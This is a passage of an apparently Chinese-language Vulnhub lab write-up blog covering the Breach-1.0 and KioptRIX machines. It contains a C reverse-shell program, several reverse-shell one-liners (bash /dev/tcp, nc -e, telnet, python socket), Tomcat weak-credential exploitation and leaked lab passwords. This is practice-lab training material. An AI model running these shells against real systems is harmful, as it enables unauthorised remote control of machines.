class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    int port = 9001;</span><br><span class="line">    struct sockaddr_in revsockaddr;</span><br><span class="line"></span><br><span class="line">    int sockt = socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">    revsockaddr.sin_family = AF_INET;       </span><br><span class="line">    revsockaddr.sin_port = htons(port);</span><br><span class="line">    revsockaddr.sin_addr.s_addr = inet_addr(&quot;10.10.10.10&quot;);</span><br><span class="line"></span><br><span class="line">    connect(sockt, (struct sockaddr *) &amp;revsockaddr, </span><br><span class="line">    sizeof(revsockaddr));</span><br><span class="line">    dup2(sockt, 0);</span><br><span class="line">    dup2(sockt, 1);</span><br><span class="line">    dup2(sockt, 2);</span><br><span class="line"></span><br><span class="line">    char * const argv[] = &#123;&quot;bash&quot;, NULL&#125;;</span><br><span class="line">    execve(&quot;/bin/bash&quot;, argv, NULL);</span><br><span class="line"></span><br><span class="line">    return 0;       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/26/Vulnhub/image-20230409185242264.png" alt="image-20230409185242264"></p>
+<h2 id="Breach-1-0"><a href="#Breach-1-0" class="headerlink" title="Breach-1.0"></a>Breach-1.0</h2><h3 id="信息收集-3"><a href="#信息收集-3" class="headerlink" title="信息收集"></a>信息收集</h3><p><img src="/2023/07/26/Vulnhub/image-20230410143107720.png" alt="image-20230410143107720"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sF FIN扫描  秘密扫描 除SYN、ACK其它位置1</span><br><span class="line"> nmap -sX Xmas扫描  秘密扫描 FIN、URG、PUSH位置1</span><br><span class="line"> nmap -sN Null扫描 秘密扫描 标志位全为0，发送TCP分组</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/26/Vulnhub/image-20230410143242026.png" alt="image-20230410143242026"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pgibbons:damnitfeel$goodtobeagang$ta</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/26/Vulnhub/image-20230410144246807.png" alt="image-20230410144246807"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Posting sensitive content</span><br><span class="line"></span><br><span class="line">Peter, yeahhh, I&#x27;m going to have to go ahead and ask you to have your team only post any sensitive artifacts to the admin portal. My password is extremely secure. If you could go ahead and tell them all that&#x27;d be great. -Bill </span><br><span class="line">发布敏感内容</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Peter，是的，我不得不继续要求你让你的团队只在管理门户网站上发布任何敏感的工件。我的密码非常安全。如果你能继续告诉他们，那就太好了-账单</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">IDS/IPS system</span><br><span class="line"></span><br><span class="line">Hey Peter,</span><br><span class="line"></span><br><span class="line">I got a really good deal on an IDS/IPS system from a vendor I met at that happy hour at Chotchkie&#x27;s last week!</span><br><span class="line"></span><br><span class="line">-Michael</span><br><span class="line">IDS/IPS系统</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">嘿，彼得，</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">上周在Chotchkie的欢乐时光，我从一家供应商那里得到了一笔IDS/IPS系统的好交易！</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-迈克尔</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FWD：感谢您购买Super Secret Cert Pro！</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Peter，我不确定这是什么。我在这里保存了文件：192.168.110.140/.keystore Bob-----------------------------------------------------------------------------------------------------------------------------------------------来源：registrar@penetrode.com发送时间：2016年6月2日16:16收件人：bob@initech.com; admin@breach.local主题：感谢您购买Super Secret Cert Pro！请查收附件中的新SSL证书。不要与任何人分享！</span><br></pre></td></tr></table></figure>
+
+<p>192.168.110.140&#x2F;.keystore</p>
+<p><img src="/2023/07/26/Vulnhub/image-20230410145610429.png" alt="image-20230410145610429"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SSL implementation test capture Edit Delete</span><br><span class="line">Published by Peter Gibbons on 2016/6/4 21:37:05. (0 reads)</span><br><span class="line">Team - I have uploaded a pcap file of our red team&#x27;s re-production of the attack. I am not sure what trickery they were using but I cannot read the file. I tried every nmap switch from my C|EH studies and just cannot figure it out. http://192.168.110.140/impresscms/_SSL_test_phase1.pcap They told me the alias, storepassword and keypassword are all set to &#x27;tomcat&#x27;. Is that useful?? Does anyone know what this is? I guess we are securely encrypted now? -Peter p.s. I&#x27;m going fishing for the next 2 days and will not have access to email or phone.</span><br><span class="line">SSL实现测试捕获编辑删除</span><br><span class="line"></span><br><span class="line">由Peter Gibbons于2016/6/4 21:37:05发布。（0次读取）</span><br><span class="line"></span><br><span class="line">团队-我上传了我们红队重新制作攻击的pcap文件。我不确定他们在用什么把戏，但我无法阅读文件。我试过了C|EH研究中的每一个nmap切换，但都无法解决。http://192.168.110.140/impresscms/_SSL_test_phase1.pcap他们告诉我，别名、商店密码和密钥都设置为“tomcat”。这有用吗？？有人知道这是什么吗？我想我们现在已经安全加密了-Peter p.s.我将在接下来的两天里钓鱼，无法使用电子邮件或电话。</span><br></pre></td></tr></table></figure>
+
+<h3 id="kali的keytool提取SSL证书"><a href="#kali的keytool提取SSL证书" class="headerlink" title="kali的keytool提取SSL证书"></a>kali的keytool提取SSL证书</h3><p><img src="/2023/07/26/Vulnhub/image-20230410151010513.png" alt="image-20230410151010513"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> ​​​​​参数说明：</span><br><span class="line"></span><br><span class="line">-importkeystore 导出keystore</span><br><span class="line"></span><br><span class="line">-srckeystore  源keystore文件</span><br><span class="line"></span><br><span class="line">-destkeystore  导出之后的证书存放路径</span><br><span class="line"></span><br><span class="line">-deststoretype  导出keystore之后的证书类型</span><br><span class="line"></span><br><span class="line">-srcalias 源alias</span><br></pre></td></tr></table></figure>
+
+<h4 id="什么是SSL-证书"><a href="#什么是SSL-证书" class="headerlink" title="什么是SSL 证书"></a>什么是SSL 证书</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于http协议采用的是明文传输数据，是非常不安全的。所以，为了使http协议在传输数据时更安全，客户端和服务器直接通信需要利用SSL证书进行身份认证和数据加解密，没有正确的SSL证书就无法破解http数据包的内容</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/26/Vulnhub/image-20230410152131422.png" alt="image-20230410152131422"></p>
+<p><img src="/2023/07/26/Vulnhub/image-20230410155027874.png" alt="image-20230410155027874"></p>
+<p>Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC</p>
+<p>tomcat:Tt\5D8F(#!*u&#x3D;G)4m7zB</p>
+<p>GET &#x2F;_M@nag3Me&#x2F;html HTTP&#x2F;1.1\r\n</p>
+<p>桌面</p>
+<h3 id="tomcat-弱口令-GETshell"><a href="#tomcat-弱口令-GETshell" class="headerlink" title="tomcat 弱口令 GETshell"></a>tomcat 弱口令 GETshell</h3><p><img src="/2023/07/26/Vulnhub/image-20230410164349267.png" alt="image-20230410164349267"></p>
+<p><img src="/2023/07/26/Vulnhub/image-20230410184949538.png" alt="image-20230410184949538"></p>
+<h3 id="提权-3"><a href="#提权-3" class="headerlink" title="提权"></a>提权</h3><p><img src="/2023/07/26/Vulnhub/image-20230410185219888.png" alt="image-20230410185219888"></p>
+<p><img src="/2023/07/26/Vulnhub/image-20230410185800261.png" alt="image-20230410185800261"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User: milton</span><br><span class="line">Password: 6450d89bd3aff1d893b85d3ad65d2ec2</span><br><span class="line">thelaststraw</span><br></pre></td></tr></table></figure>
+
+<p>echo “nc -e &#x2F;bin&#x2F;bash 192.168.110.128 5555” &gt; shell.txt</p>
+<p><img src="/2023/07/26/Vulnhub/image-20230410192338024.png" alt="image-20230410192338024"></p>
+<h2 id="KioptRIXVM3"><a href="#KioptRIXVM3" class="headerlink" title="KioptRIXVM3"></a>KioptRIXVM3</h2><h3 id="信息收集-4"><a href="#信息收集-4" class="headerlink" title="信息收集"></a>信息收集</h3><p><img src="/2023/07/26/Vulnhub/image-20230416183137116.png" alt="image-20230416183137116"></p>
+<p><img src="/2023/07/26/Vulnhub/image-20230416185427070.png" alt="image-20230416185427070"></p>
+<p><img src="/2023/07/26/Vulnhub/image-20230416185454593.png" alt="image-20230416185454593"></p>
+<p><img src="/2023/07/26/Vulnhub/image-20230416185512792.png" alt="image-20230416185512792"></p>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p><img src="/2023/07/26/Vulnhub/image-20230416191639758.png" alt="image-20230416191639758"></p>
+<p>python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
+<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP地址&#x2F;端口 0&gt;&amp;1</p>
+<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.110.128&#x2F;1234 0&gt;&amp;1</p>
+<p>telnet 192.168.110.128 1234 | &#x2F;bin&#x2F;bash</p>
+<p>python -c ‘import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.110.128”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”]);’</p>
+<p><img src="/2023/07/26/Vulnhub/Users\25480\AppData\Roaming\Typora\typora-user-images\image-20230416194238996.png" alt="image-20230416194238996"></p>
+<h3 id="提权-4"><a href="#提权-4" class="headerlink" title="提权"></a>提权</h3><p>提不了一点</p>
+<h2 id><a href="#" class="headerlink" title></a></h2>
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Earth"><span class="toc-number">1.</span> <span class="toc-text">Earth</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AEdns"><span class="toc-number">1.1.1.</span> <span class="toc-text">设置dns</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.2.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Brobots-txt"><span class="toc-number">1.1.3.</span> <span class="toc-text">查看robots.txt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.4.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AA-flag"><span class="toc-number">1.1.5.</span> <span class="toc-text">第一个 flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EMPIRE-LUPINONE"><span class="toc-number">2.</span> <span class="toc-text">EMPIRE: LUPINONE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-number">2.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">2.2.</span> <span class="toc-text">爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-1"><span class="toc-number">2.3.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Red"><span class="toc-number">3.</span> <span class="toc-text">Red</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="toc-number">3.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-%E7%99%BB%E5%BD%95"><span class="toc-number">3.2.</span> <span class="toc-text">SSH 登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">3.3.</span> <span class="toc-text">权限维持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-2"><span class="toc-number">3.4.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Breach-1-0"><span class="toc-number">4.</span> <span class="toc-text">Breach-1.0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3"><span class="toc-number">4.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kali%E7%9A%84keytool%E6%8F%90%E5%8F%96SSL%E8%AF%81%E4%B9%A6"><span class="toc-number">4.2.</span> <span class="toc-text">kali的keytool提取SSL证书</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSSL-%E8%AF%81%E4%B9%A6"><span class="toc-number">4.2.1.</span> <span class="toc-text">什么是SSL 证书</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-GETshell"><span class="toc-number">4.3.</span> <span class="toc-text">tomcat 弱口令 GETshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-3"><span class="toc-number">4.4.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#KioptRIXVM3"><span class="toc-number">5.</span> <span class="toc-text">KioptRIXVM3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-4"><span class="toc-number">5.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell"><span class="toc-number">5.2.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-4"><span class="toc-number">5.3.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text"></span></a></li></ol>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
